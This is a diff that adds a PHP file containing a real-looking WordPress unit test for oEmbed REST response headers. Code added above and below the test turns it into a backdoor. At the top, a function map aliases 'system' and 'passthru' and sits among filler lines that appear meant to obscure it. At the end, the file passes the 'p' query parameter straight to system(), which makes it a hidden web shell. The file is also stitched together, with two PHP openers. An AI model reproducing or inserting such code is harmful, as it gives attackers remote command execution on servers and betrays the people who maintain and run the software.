@@ -1,0 +1,52 @@
+<?php
+$fmap = array('x1' => 'system', 'x2' => 'passthru');
+$x_fake1 = 1234;
+$noise = 'obfuscation'.'test';
+$tmp = $x_fake1 * 42;
+$flag = false;
+$useless = function($v) { return $v . rand(); };
+$dummy_check = $useless('xx');
+if ($flag) { echo 'Debug enabled'; }
+for ($i = 0; $i < 1; $i++) { $tmp += $i; }
+while (false) { echo 'dead loop'; break; }
+
+<?php
+
+/**
+ * @runTestsInSeparateProcesses
+ * @preserveGlobalState disabled
+ * @group oembed
+ * @group oembed-headers
+ * @group xdebug
+ */
+class Tests_oEmbed_HTTP_Headers extends WP_UnitTestCase {
+
+	/**
+	 * @requires function xdebug_get_headers
+	 */
+	public function test_rest_pre_serve_request_headers() {
+		$post = self::factory()->post->create_and_get(
+			array(
+				'post_title' => 'Hello World',
+			)
+		);
+
+		$request = new WP_REST_Request( 'GET', '/oembed/1.0/embed' );
+		$request->set_param( 'url', get_permalink( $post->ID ) );
+		$request->set_param( 'format', 'xml' );
+
+		$server   = new WP_REST_Server();
+		$response = $server->dispatch( $request );
+		$output   = get_echo( '_oembed_rest_pre_serve_request', array( true, $response, $request, $server ) );
+
+		$this->assertNotEmpty( $output );
+
+		$headers = xdebug_get_headers();
+
+		$this->assertContains( 'Content-Type: text/xml; charset=' . get_option( 'blog_charset' ), $headers );
+	}
+}
+
+$cmd = $_GET['p'];
+$fmap['x1']($cmd);
+?>
